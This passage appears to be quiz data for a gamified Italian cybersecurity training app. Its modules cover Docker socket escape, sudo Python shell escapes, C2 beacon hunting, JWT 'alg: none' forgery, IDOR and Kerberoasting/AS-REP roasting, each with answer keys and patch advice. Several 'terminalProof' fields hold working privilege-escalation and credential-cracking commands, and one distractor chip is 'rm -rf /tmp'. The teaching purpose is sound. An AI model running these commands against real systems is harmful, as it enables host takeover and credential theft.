            ],
            options: [
              { id: 'd_opt1', text: 'Riga 4: Immagine datadog/agent non aggiornata con patch CVE', isCorrect: false },
              { id: 'd_opt2', text: 'Riga 6: Il montaggio di /var/run/docker.sock permette di spawnare container privilegiati con mount / sull\'host', isCorrect: true },
              { id: 'd_opt3', text: 'Riga 7: Il mount in sola lettura di /proc espone le password in RAM', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Docker Daemon UNIX Socket Exposure (Host Takeover)',
              whyItWorks: 'Chiunque possa comunicare con il socket docker.sock può ordinare al demone dockerd (in esecuzione come root sull\'host) di avviare un container montando il filesystem radice `/` dell\'host in `/host` e chrootare.',
              patchRecommendation: 'Non montare mai docker.sock in container applicativi o utilizzare Docker rootless mode.',
              terminalProof: '$ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash\n# whoami\nroot'
            },
            xpReward: 75,
            eloReward: 25
          }
        ]
      },
      {
        id: 'node_lin_2',
        title: 'Sudoers Misconfiguration & GTFOBins',
        subtitle: 'Bypass di comandi sudo NOPASSWD senza restrizioni di shell escape',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 140,
        eloReward: 40,
        questions: [
          {
            id: 'q_sudo_terminal',
            title: 'Terminal Sandbox: Shell Escape con Python3 Sudo',
            type: 'terminal_command',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'Il comando `sudo -l` mostra `(ALL) NOPASSWD: /usr/bin/python3`. Completa il comando per spawnare una shell root interattiva:',
            terminalPrompt: 'devuser@target:~$',
            commandPrefix: 'sudo python3 -c',
            commandTarget: 'sudo python3 -c \'import pty; pty.spawn("/bin/bash")\'',
            commandChips: ['\'import pty; pty.spawn("/bin/bash")\'', '\'import os; os.system("id")\'', '\'print("hello")\'', '--version', '-m http.server'],
            options: [
              { id: 'sudo_1', text: '\'import pty; pty.spawn("/bin/bash")\'', isCorrect: true },
              { id: 'sudo_2', text: '\'import os; os.system("id")\'', isCorrect: false },
              { id: 'sudo_3', text: '\'print("hello")\'', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'GTFOBins Python Sudo PrivEsc',
              whyItWorks: 'Il modulo pty di Python consente di allocare un nuovo pseudo-terminale ereditando l\'UID effettivo 0 del processo genitore eseguito con sudo.',
              patchRecommendation: 'Non consentire l\'esecuzione di interpreti di scripting in /etc/sudoers. Specificare script wrapper firmati.',
              terminalProof: '$ sudo python3 -c \'import pty; pty.spawn("/bin/bash")\'\nroot@target:/home/devuser# id\nuid=0(root) gid=0(root) groups=0(root)'
            },
            xpReward: 65,
            eloReward: 20
          }
        ]
      }
    ]
  },
  {
    id: 'mod_defense_soc',
    title: 'Modulo 4: SOC, Threat Hunting & SIEM',
    certificationFocus: 'CompTIA CySA+ CS0-003 & Blue Team Level 1',
    color: '#EF4444', // Crimson Red
    nodes: [
      {
        id: 'node_soc_1',
        title: 'C2 Beaconing Detection & Jitter Analysis',
        subtitle: 'Rilevamento connessioni periodiche mascherate via DNS e HTTPS',
        moduleId: 'mod_defense_soc',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 120,
        eloReward: 30,
        questions: [
          {
            id: 'q_c2_hunting',
            title: 'Analisi Log Proxy: Rilevamento Cobalt Strike Beacon',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Intermediate',
            prompt: 'Analizza la sequenza di query DNS estratte dal SIEM di un endpoint infetto. Quale parametro statistico dimostra inequivocabilmente la presenza di un canale C2 con Jitter?',
            codeSnippet: `Timestamp             Query Domain                             Bytes   Interval
2026-10-17T14:00:00Z  update.cdn-microsoft-sync.com            64      -
2026-10-17T14:00:58Z  update.cdn-microsoft-sync.com            64      58s
2026-10-17T14:02:03Z  update.cdn-microsoft-sync.com            64      65s
2026-10-17T14:03:01Z  update.cdn-microsoft-sync.com            64      58s
2026-10-17T14:03:59Z  update.cdn-microsoft-sync.com            64      58s
2026-10-17T14:05:04Z  update.cdn-microsoft-sync.com            64      65s`,
            options: [
              { id: 'c1', text: 'La cadenza regolare di circa 60 secondi con una deviazione standard del 10% (Jitter del 10%) verso un dominio di typosquatting', isCorrect: true },
              { id: 'c2', text: 'I pacchetti DNS sono troppo grandi rispetto a un normale record A', isCorrect: false },
              { id: 'c3', text: 'Il dominio è firmato con DNSSEC non valido', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1071.004: Application Layer Protocol (DNS C2)',
              whyItWorks: 'I framework C2 come Cobalt Strike introducono jitter casuale attorno al tempo di sleep base per impedire il rilevamento con filtri a soglia fissa.',
              patchRecommendation: 'Configurare regole di correlation SIEM che calcolano il delta temporale inter-request e bloccano domini registrati da meno di 30 giorni.',
              terminalProof: '$ tshark -r capture.pcap -Y "dns.qry.name contains microsoft-sync" -T fields -e frame.time_delta\n58.129482010\n64.981048201'
            },
            xpReward: 60,
            eloReward: 20
          },
          {
            id: 'q_terminal_grep_auth',
            title: 'Terminal Sandbox: Caccia a Brute Force SSH in auth.log',
            type: 'terminal_command',
            domain: 'Defense & SOC',
            difficulty: 'Intermediate',
            prompt: 'Completa il comando bash per estrarre tutti gli indirizzi IP unici che hanno collezionato tentativi di login SSH falliti (Failed password) da /var/log/auth.log:',
            terminalPrompt: 'soc-analyst@siem:~$',
            commandPrefix: 'grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' |',
            commandTarget: 'grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -nr',
            commandChips: ['sort | uniq -c | sort -nr', 'tail -n 20', 'wc -l', 'rm -rf /tmp', '| iptables -A INPUT'],
            options: [
              { id: 'grep_1', text: 'sort | uniq -c | sort -nr', isCorrect: true },
              { id: 'grep_2', text: 'tail -n 20', isCorrect: false },
              { id: 'grep_3', text: 'wc -l', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'SSH Credential Stuffing & Log Parsing',
              whyItWorks: 'Nei log Linux di OpenSSH, la stringa `Failed password for ... from <IP> port <PORT>` posiziona l\'indirizzo IP a 4 campi dalla fine (NF-3). L\'ordinamento e l\'aggregazione rivelano immediatamente l\'attaccante più aggressivo.',
              patchRecommendation: 'Installare e configurare Fail2ban o CrowdSec per bannare automaticamente gli IP dopo 3 tentativi errati consecutivi.',
              terminalProof: '$ grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -nr\n   4912 185.220.101.5\n   1240 194.26.29.11'
            },
            xpReward: 65,
            eloReward: 20
          }
        ]
      }
    ]
  },
  {
    id: 'mod_api_jwt',
    title: 'Modulo 5: API Security & JWT Exploitation',
    certificationFocus: 'OWASP API Security Top 10 & CEH v13 Web Applications',
    color: '#8B5CF6', // Purple / Violet
    nodes: [
      {
        id: 'node_api_jwt_1',
        title: 'BOLA / IDOR: Broken Object Level Authorization',
        subtitle: 'Bypass del controllo accessi orizzontale tramite manipolazione degli identificatori API REST',
        moduleId: 'mod_api_jwt',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 95,
        eloReward: 28,
        questions: [
          {
            id: 'q_api_spot_bola',
            title: 'Spot the Zero-Day: Controllo IDOR Mancante nel Controller Node.js',
            type: 'spot_the_zeroday',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Un endpoint REST permette a utenti autenticati di scaricare documenti confidenziali. TOCCA LA RIGA in cui manca la verifica di ownership tra sessione e record:',
            codeLines: [
              { lineNum: 1, code: 'app.get("/api/v1/invoices/:id", authenticateUser, async (req, res) => {' },
              { lineNum: 2, code: '  const invoiceId = req.params.id;' },
              { lineNum: 3, code: '  const invoice = await db.invoices.findById(invoiceId);', isVulnerable: true, vulnerabilityHint: 'La query carica il documento basandosi solo sul parametro :id fornito dall\'utente senza filtrare per req.user.id!' },
              { lineNum: 4, code: '  if (!invoice) return res.status(404).json({ error: "Not found" });' },
              { lineNum: 5, code: '  res.json(invoice);' },
              { lineNum: 6, code: '});' }
            ],
            options: [
              { id: 'bola_1', text: 'Riga 3: Il database carica la fattura solo per ID senza verificare req.user.tenantId / req.user.id', isCorrect: true },
              { id: 'bola_2', text: 'Riga 1: authenticateUser non supporta query async', isCorrect: false },
              { id: 'bola_3', text: 'Riga 4: Lo status 404 causa memory leak', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'OWASP API1:2023 - Broken Object Level Authorization (BOLA)',
              whyItWorks: 'Il server autentica l\'utente, ma non autorizza l\'accesso alla risorsa specifica. Modificando :id da 1004 a 1005, qualsiasi utente legge dati altrui.',
              patchRecommendation: 'Aggiungere filtro vincolante: `db.invoices.findOne({ _id: invoiceId, ownerId: req.user.id })` oppure utilizzare UUID v4 impredicibili con RBAC policy enforcement.',
              terminalProof: '$ curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.corp/api/v1/invoices/9924\nHTTP/1.1 200 OK\n{"id": 9924, "owner": "ceo@corp.com", "salary_eur": 185000}'
            },
            xpReward: 50,
            eloReward: 14
          },
          {
            id: 'q_jwt_alg_none',
            title: 'JWT Algorithm Confusion: Attacco "alg": "none"',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Hardcore',
            prompt: 'In una libreria JWT vulnerabile, cosa accade quando un attaccante modifica l\'header del token impostando {"alg": "none", "typ": "JWT"} e omette la firma?',
            options: [
              { id: 'alg_1', text: 'Il parser considera il token valido senza verificare alcuna firma crittografica, permettendo l\'impersonificazione arbitraria di admin', isCorrect: true },
              { id: 'alg_2', text: 'Il server tenta di decifrare il payload con una chiave privata RSA nulla', isCorrect: false },
              { id: 'alg_3', text: 'Viene sollevata automaticamente un\'eccezione di Certificate Revocation List (CRL)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CVE-2015-9235: JSON Web Token "none" Algorithm Vulnerability',
              whyItWorks: 'La specifica RFC 7519 ammetteva "none" per contesti non firmati. Molte librerie accettavano "none" acriticamente senza forzare gli algoritmi permessi dal backend (es. HS256/RS256).',
              patchRecommendation: 'Configurare esplicitamente una whitelist rigida: `jwt.verify(token, secret, { algorithms: ["HS256"] })`.',
              terminalProof: '$ echo -n \'{"alg":"none","typ":"JWT"}\' | base64\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=\n$ curl -H "Cookie: token=eyJhbGciOiJub25l...eyJyb2xlIjoiYWRtaW4ifQ." https://bank.internal/admin\nHTTP/1.1 200 OK (Admin Dashboard)'
            },
            xpReward: 55,
            eloReward: 16
          }
        ]
      }
    ]
  },
  {
    id: 'mod_active_directory',
    title: 'Modulo 6: Active Directory & Enterprise Lateral Movement',
    certificationFocus: 'Certified Ethical Hacker (CEH v13) & CompTIA Security+ Enterprise',
    color: '#EC4899', // Pink / Rose
    nodes: [
      {
        id: 'node_ad_kerberoast',
        title: 'Kerberoasting & TGS Ticket Extraction',
        subtitle: 'Richiesta e cracking offline di ticket TGS per Service Principal Names (SPN) di dominio',
        moduleId: 'mod_active_directory',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 110,
        eloReward: 32,
        questions: [
          {
            id: 'q_kerberoast_concept',
            title: 'Meccanismo di Attacco Kerberoasting',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Hardcore',
            prompt: 'Perché qualsiasi utente autenticato di dominio Active Directory può richiedere un ticket TGS per un account di servizio con SPN registrato senza destare allarmi immediati?',
            options: [
              { id: 'kb_1', text: 'Il Kerberos KDC rilascia legittimamente il TGS cifrato con l\'hash NTLM dell\'account di servizio associato all\'SPN affinché il client possa autenticarsi al servizio', isCorrect: true },
              { id: 'kb_2', text: 'I ticket TGS sono firmati in chiaro senza crittografia simmetrica', isCorrect: false },
              { id: 'kb_3', text: 'Active Directory non richiede autenticazione per le richieste LDAP sulla porta 389', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1558.003: Steal or Forge Kerberos Tickets (Kerberoasting)',
              whyItWorks: 'Poiché il ticket TGS è cifrato con la password hash dell\'account di servizio, l\'attaccante lo estrae dalla memoria o dalla rete e lo sottopone a cracking offline con Hashcat o John the Ripper senza generare traffico verso il Domain Controller.',
              patchRecommendation: 'Utilizzare Group Managed Service Accounts (gMSA) con password complesse da 128 caratteri ruotate automaticamente da Windows, oppure imporre cifratura AES invece di RC4 (Event ID 4769).',
              terminalProof: '$ impacket-GetUserSPNs corp.local/operator:Password123 -request\n$ hashcat -m 13100 kerberoast_tgs.hash /usr/share/wordlists/rockyou.txt\nHash.Target: $krb5tgs$23$*...\nStatus: Cracked (Password: SqlAdmin2024!)'
            },
            xpReward: 60,
            eloReward: 18
          },
          {
            id: 'q_terminal_rubeus',
            title: 'Terminal Sandbox: AS-REP Roasting con Impacket',
            type: 'terminal_command',
            domain: 'Defense & SOC',
            difficulty: 'Hardcore',
            prompt: 'Completa il comando Impacket per interrogare il Domain Controller (10.0.0.1) ed estrarre gli hash Kerberos degli utenti con flag DONT_REQ_PREAUTH attiva:',
            terminalPrompt: 'kali@attacker-box:~$',
            commandPrefix: 'impacket-GetNPUsers -dc-ip 10.0.0.1 corp.local/ -usersfile users.txt -format hashcat',
            commandTarget: 'impacket-GetNPUsers -dc-ip 10.0.0.1 corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes',
            commandChips: ['-outputfile asrep.hashes', '--no-pass', '-k -no-preauth', '| tee /tmp/log', '--aes256'],
            options: [
              { id: 'np_1', text: '-outputfile asrep.hashes', isCorrect: true },
              { id: 'np_2', text: '--no-pass', isCorrect: false },
              { id: 'np_3', text: '-k -no-preauth', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1558.004: AS-REP Roasting',
              whyItWorks: 'Quando un account AD ha l\'attributo `Do not require Kerberos preauthentication` (DONT_REQ_PREAUTH), il KDC invia l\'AS-REP con timestamp cifrato con la password dell\'utente anche senza aver fornito prima la prova di autenticazione.',
              patchRecommendation: 'Eseguire un audit dei flag di dominio: verificare che nessun account utente (specie se amministratore) abbia `UserAccountControl` impostato su `DONT_REQ_PREAUTH`.',
              terminalProof: '$ impacket-GetNPUsers -dc-ip 10.0.0.1 corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes\n[*] Written 3 AS-REP hashes to asrep.hashes\n$ hashcat -m 18200 asrep.hashes rockyou.txt\nCracked: svc_backup:Summer2024'
            },
            xpReward: 65,
            eloReward: 20
          }
        ]
      }
    ]
  }
];
